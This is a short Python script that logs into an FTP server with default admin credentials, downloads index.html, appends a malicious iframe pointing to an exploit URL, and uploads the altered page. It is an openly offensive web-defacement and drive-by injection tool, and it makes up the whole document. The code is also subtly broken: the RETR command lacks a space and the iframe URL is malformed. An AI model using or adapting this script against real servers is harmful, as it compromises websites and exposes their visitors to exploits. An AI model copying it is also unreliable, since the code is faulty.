import ftplib

def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR' + page, f.write)
    print('[+] Download Page: ' + page)

    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)

host = '127.0.0.1'
username = 'admin'
password = 'admin'

ftp = ftplib.FTP(host)
ftp.login(username, password)
redirect = '<iframe src=http:\\\\127.0.0.1:8080\\exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)
